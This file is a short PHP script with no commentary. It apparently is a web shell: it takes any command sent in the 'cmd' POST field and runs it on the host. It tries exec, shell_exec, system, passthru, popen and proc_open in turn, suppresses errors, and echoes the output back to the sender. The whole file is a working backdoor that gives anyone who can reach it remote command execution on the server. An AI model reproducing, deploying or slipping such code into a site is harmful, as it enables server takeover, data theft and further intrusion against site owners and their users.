<?php
function ex($cfe)
{
  $res = '';
 
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
  
 return $res;
}

if($_POST['cmd']!="php_eval"){
   $cmd_rep = ex($_POST['cmd']);
   echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n";
}

?>